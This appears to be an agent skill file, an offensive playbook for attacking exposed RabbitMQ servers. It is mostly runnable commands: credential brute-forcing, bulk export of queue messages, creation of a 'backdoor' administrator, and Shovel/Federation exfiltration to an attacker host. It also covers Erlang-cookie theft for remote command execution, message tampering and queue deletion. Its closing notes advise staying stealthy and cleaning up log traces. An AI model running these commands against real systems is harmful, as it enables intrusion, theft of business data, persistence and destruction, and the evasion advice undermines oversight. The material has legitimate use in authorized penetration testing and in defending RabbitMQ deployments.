---
name: rabbitmq-tactics
description: "RabbitMQ unauthorized access and exploitation. Use when a target exposes ports 5672/15672, the RabbitMQ Management API is reachable, default guest/guest credentials are unchanged, or you need to steal message data from RabbitMQ. Covers default credential attacks, Management API enumeration, bulk queue message export, Exchange abuse, user creation and password change, VHost manipulation, Shovel/Federation data exfiltration, cluster information theft, Erlang Cookie RCE, and message tampering"
zh-signals: "RabbitMQ 未授权访问与利用，覆盖默认凭据、Management API 枚举、消息导出与 Erlang Cookie RCE。信号:RabbitMQ,5672端口,Management API,消息队列,Erlang Cookie"
when-to-use: >-
  Use when a target exposes RabbitMQ ports 5672/15672 or the Management API,
  especially with default guest/guest credentials, and you need to enumerate, extract
  messages, or assess RCE paths under authorization.
metadata:
  tags: "rabbitmq,5672,15672,amqp,management-api,guest,erlang-cookie,shovel,federation,vhost,message-queue"
  category: "postexploit"
---

# RabbitMQ Unauthorized Access and Exploitation

RabbitMQ enables the Management Plugin by default and ships with guest/guest credentials (localhost only), but many instances set `loopback_users = none`, which makes the guest account remotely accessible — going from message theft to Erlang Cookie RCE takes only a few steps.

## Further Reading (Must Read)
- Full exploitation commands and payloads → read [references/attack-techniques.md](references/attack-techniques.md)

---

## Phase 1: Service Discovery and Port Identification

### 1.1 Port Scanning

```bash
# Common ports: 5672(AMQP), 15672(Management UI), 4369(epmd), 25672(cluster communication)
nmap -sV -p 5672,15672,4369,25672 TARGET

# AMQP service probe
nmap -sV -p 5672 --script amqp-info TARGET
```

### 1.2 Management UI Probe

```bash
# Check whether the Management API is reachable
curl -s -o /dev/null -w "%{http_code}" http://TARGET:15672/api/overview

# HTTPS variant
curl -sk -o /dev/null -w "%{http_code}" https://TARGET:15672/api/overview
```

**Key Decision**:
- Returns 401 → Management API is reachable, credentials are required, go to Phase 2
- Returns 200 → Valid authentication already exists or no authentication is needed (rare), go straight to Phase 3
- Connection fails → Management Plugin is not enabled, try connecting directly to 5672 AMQP
- 4369 is open → epmd is exposed and Erlang node names can be enumerated

---

## Phase 2: Default Credentials and Weak Password Detection

### 2.1 Default Credentials

```bash
# guest/guest (most common, localhost-only by default but often configured for remote access)
curl -s -u guest:guest http://TARGET:15672/api/overview | jq '.rabbitmq_version'

# admin/admin
curl -s -u admin:admin http://TARGET:15672/api/overview | jq '.rabbitmq_version'

# Batch test common credentials
for creds in "guest:guest" "admin:admin" "admin:password" "admin:123456" "rabbitmq:rabbitmq"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -u "$creds" http://TARGET:15672/api/overview)
  echo "$creds -> $code"
done
```

### 2.2 Brute Force

```bash
# Hydra against HTTP Basic Auth
hydra -L users.txt -P passwords.txt TARGET http-get /api/overview -s 15672

# Nmap HTTP brute force
nmap -p 15672 --script http-brute --script-args http-brute.path=/api/overview TARGET
```

**Key Decision**:
- Returns 200 + JSON data → credentials are valid, go to Phase 3
- All 401 → no weak credentials, try connecting directly to AMQP on port 5672 or look for another entry point

---

## Phase 3: Attack Decision Tree

```
Credentials valid?
├─ Management API available (15672)
│   ├─ User has the administrator tag
│   │   ├─ Enumerate queues/Exchanges/VHosts → bulk message export (Phase 4.1)
│   │   ├─ Create a backdoor user → persistent access (Phase 4.2)
│   │   ├─ Configure Shovel/Federation → exfiltrate data to the attacker machine (Phase 4.3)
│   │   └─ Read cluster/node information → lateral movement (Phase 4.4)
│   └─ User has regular privileges
│       ├─ Read messages from accessible queues
│       └─ Enumerate Exchange bindings
├─ Filesystem is accessible
│   ├─ Read the Erlang Cookie → RCE (Phase 5)
│   └─ Read rabbitmq.conf → obtain more credentials
└─ Only AMQP 5672 is reachable
    ├─ Enumerate by connecting with an amqp client
    └─ Listen on message consumption
```

**Preliminary Information Gathering**:

```bash
# Get the RabbitMQ version and cluster name
curl -s -u USER:PASS http://TARGET:15672/api/overview | jq '{rabbitmq_version, cluster_name, erlang_version}'

# List all users and their tags (to determine privilege level)
curl -s -u USER:PASS http://TARGET:15672/api/users | jq '.[] | {name, tags}'

# List all VHosts
curl -s -u USER:PASS http://TARGET:15672/api/vhosts | jq '.[].name'

# List the current user's permissions
curl -s -u USER:PASS http://TARGET:15672/api/permissions | jq '.'
```

---

## Phase 4: Management API Exploitation Quick Reference

### 4.1 Queue Enumeration and Bulk Message Export

```bash
# List all queues (watch the messages field, a non-zero value means pending messages)
curl -s -u USER:PASS http://TARGET:15672/api/queues | jq '.[] | {vhost, name, messages}'

# Fetch messages from a specific queue (requeue: true does not delete the original messages)
curl -s -u USER:PASS \
  "http://TARGET:15672/api/queues/%2F/QUEUE_NAME/get" \
  -H "content-type: application/json" \
  -d '{"count": 100, "requeue": true, "encoding": "auto"}'

# Bulk export messages from all queues
for queue in $(curl -s -u USER:PASS http://TARGET:15672/api/queues | jq -r '.[].name'); do
  echo "=== Queue: $queue ==="
  curl -s -u USER:PASS \
    "http://TARGET:15672/api/queues/%2F/$queue/get" \
    -H "content-type: application/json" \
    -d '{"count": 10000, "requeue": true, "encoding": "auto"}'
done > rabbitmq_messages_dump.json
```

### 4.2 User Creation and Permission Manipulation

```bash
# Create an administrator user
curl -u USER:PASS -X PUT \
  http://TARGET:15672/api/users/backdoor \
  -H "content-type: application/json" \
  -d '{"password": "P@ssw0rd!", "tags": "administrator"}'

# Grant full permissions (on the / VHost)
curl -u USER:PASS -X PUT \
  "http://TARGET:15672/api/permissions/%2F/backdoor" \
  -H "content-type: application/json" \
  -d '{"configure": ".*", "write": ".*", "read": ".*"}'

# Change the password of an existing user
curl -u USER:PASS -X PUT \
  http://TARGET:15672/api/users/admin \
  -H "content-type: application/json" \
  -d '{"password": "newP@ss", "tags": "administrator"}'
```

### 4.3 Shovel/Federation Data Exfiltration

```bash
# Create a Shovel: forward target queue messages to the attacker machine in real time
curl -u USER:PASS -X PUT \
  "http://TARGET:15672/api/parameters/shovel/%2F/exfil-shovel" \
  -H "content-type: application/json" \
  -d '{
    "value": {
      "src-uri": "amqp://localhost",
      "src-queue": "sensitive-queue",
      "dest-uri": "amqp://ATTACKER_IP",
      "dest-queue": "stolen-data"
    }
  }'

# Create a Federation Upstream: mirror the target Exchange
curl -u USER:PASS -X PUT \
  "http://TARGET:15672/api/parameters/federation-upstream/%2F/attacker-upstream" \
  -H "content-type: application/json" \
  -d '{
    "value": {
      "uri": "amqp://ATTACKER_IP",
      "prefetch-count": 1000
    }
  }'
```

### 4.4 Cluster and Node Information

```bash
# Node list (hostname, Erlang version, memory usage)
curl -s -u USER:PASS http://TARGET:15672/api/nodes | jq '.[] | {name, erlang_version, mem_used}'

# Current connections (client IP, username)
curl -s -u USER:PASS http://TARGET:15672/api/connections | jq '.[] | {peer_host, peer_port, user}'

# Channel information
curl -s -u USER:PASS http://TARGET:15672/api/channels | jq '.[] | {connection_details, user}'
```

→ Full API endpoints and payloads → read [references/attack-techniques.md](references/attack-techniques.md)

---

## Phase 5: Erlang Cookie RCE Quick Reference

### 5.1 Obtaining the Erlang Cookie

```bash
# Common paths
cat /var/lib/rabbitmq/.erlang.cookie
cat /home/rabbitmq/.erlang.cookie
cat ~/.erlang.cookie

# Environment variables
env | grep -i erlang
```

### 5.2 Command Execution via the Cookie

```bash
# Connect to the target node with the stolen cookie
# Obtain the node name (from the Management API or epmd)
epmd -names  # query on port 4369

# Execute commands through the Erlang remote shell
erl -sname attacker -setcookie STOLEN_COOKIE -remsh rabbit@TARGET_HOSTNAME

# Execute system commands in the Erlang shell
> os:cmd("id").
> os:cmd("cat /etc/passwd").
> os:cmd("whoami").

# Or manage remotely through rabbitmqctl
RABBITMQ_ERLANG_COOKIE=STOLEN_COOKIE rabbitmqctl -n rabbit@TARGET_HOSTNAME cluster_status
RABBITMQ_ERLANG_COOKIE=STOLEN_COOKIE rabbitmqctl -n rabbit@TARGET_HOSTNAME eval 'os:cmd("id").'
```

**Key Decision**:
- Erlang Cookie matches → RCE is possible, with privileges equivalent to the RabbitMQ process user
- Cookie does not match → `PROTOCOL_ERROR` / connection refused, exploitation is not possible

→ Read [references/attack-techniques.md](references/attack-techniques.md) for complete Erlang exploitation details

---

## Phase 6: Exchange Abuse and Message Tampering

### 6.1 Exchange Enumeration

```bash
# List all Exchanges
curl -s -u USER:PASS http://TARGET:15672/api/exchanges | jq '.[] | {vhost, name, type}'

# Inspect Exchange bindings
curl -s -u USER:PASS \
  "http://TARGET:15672/api/exchanges/%2F/EXCHANGE_NAME/bindings/source" | jq '.'
```

### 6.2 Message Injection

```bash
# Publish a message to an Exchange (can interfere with business logic)
curl -u USER:PASS \
  "http://TARGET:15672/api/exchanges/%2F/EXCHANGE_NAME/publish" \
  -H "content-type: application/json" \
  -d '{"routing_key": "target.key", "payload": "injected_data", "payload_encoding": "string", "properties": {}}'
```

### 6.3 Message Tampering and Deletion

```bash
# Consume a message (not requeued = deleted)
curl -s -u USER:PASS \
  "http://TARGET:15672/api/queues/%2F/QUEUE_NAME/get" \
  -H "content-type: application/json" \
  -d '{"count": 1, "requeue": false, "encoding": "auto"}'

# Purge the queue
curl -X DELETE -u USER:PASS \
  "http://TARGET:15672/api/queues/%2F/QUEUE_NAME/contents"

# Delete the entire queue
curl -X DELETE -u USER:PASS \
  "http://TARGET:15672/api/queues/%2F/QUEUE_NAME"
```

→ Read [references/attack-techniques.md](references/attack-techniques.md) for the complete message tampering workflow

---

## Tool Quick Reference

| Tool | Purpose |
|------|------|
| curl + Management API | The basis for all HTTP API operations |
| rabbitmqadmin | Official RabbitMQ CLI management tool |
| amqp-tools (amqp-publish/amqp-consume) | Direct AMQP protocol send/receive |
| pika (Python) | Python AMQP client for writing automation scripts |
| hydra | HTTP Basic Auth brute forcing |
| nmap amqp-info | AMQP service information gathering |
| epmd | Erlang port mapper, enumerates node names |
| erl | Erlang shell, RCE with the Cookie |

---

## Notes

- `guest/guest` only allows localhost connections by default; remote access means `loopback_users = none` is configured
- Using `requeue: false` when fetching messages consumes them permanently, use it with care in production (`requeue: true` is recommended)
- After configuring Shovel/Federation messages are forwarded in real time and the traffic may be captured by network monitoring
- The Erlang Cookie is usually a fixed string, and all nodes in a cluster share the same cookie
- `%2F` is the URL-encoded form of `/`, representing the default VHost, and API calls must use the encoded form
- Backdoor users and Shovels are visible in the Management UI, watch out for stealth
- rabbitmqctl operations are logged in the RabbitMQ logs, remember to clean up traces
